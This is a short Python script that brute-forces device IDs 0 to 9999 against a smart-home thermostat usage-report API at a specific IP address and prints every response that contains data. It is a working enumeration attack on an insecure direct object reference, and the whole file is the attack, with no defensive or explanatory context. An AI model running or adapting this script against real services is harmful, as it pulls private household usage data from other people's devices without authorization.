import requests

url = "http://98.70.102.40:8080/api/smart-home/thermostat/usage-report"

for device_id in range(10000):  # Guessing from 0 to 9999
    full_url = f"{url}?deviceId={device_id}"
    res = requests.get(full_url)
    
    if "data" in res.text:
        print(f"[+] Found device {device_id}: {res.text}")
